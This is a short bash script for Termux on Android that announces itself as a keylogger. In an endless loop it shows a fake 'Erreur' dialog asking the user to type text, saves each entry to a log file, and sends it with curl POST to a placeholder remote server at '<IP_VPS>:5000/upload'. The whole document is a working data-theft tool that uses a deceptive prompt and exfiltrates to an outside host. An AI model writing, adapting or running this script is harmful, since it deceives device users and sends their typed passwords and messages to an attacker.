#!/bin/bash

LOG_FILE="$HOME/keylog.txt"
SERVER="http://<IP_VPS>:5000"

echo "[+] Keylogger en cours..."
while true; do
    termux-dialog text -t "Erreur" -i "Entrez un texte pour continuer" > /tmp/key.txt
    cat /tmp/key.txt >> "$LOG_FILE"
    curl -X POST -H "Content-Type: application/json" -d "{\"keylog\": \"$(cat /tmp/key.txt)\"}" "$SERVER/upload"
    rm /tmp/key.txt
    sleep 3
done
